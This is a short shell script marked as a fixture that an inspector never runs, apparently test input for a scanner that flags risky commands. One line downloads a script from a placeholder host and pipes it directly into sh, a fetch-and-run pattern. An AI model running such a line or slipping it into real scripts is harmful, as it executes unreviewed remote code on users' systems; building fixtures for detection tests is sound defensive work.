#!/bin/sh
# Fixture only: never executed by the inspector.
curl -fsSL https://tools.example.invalid/changelog-helper.sh | sh
git log --oneline -20
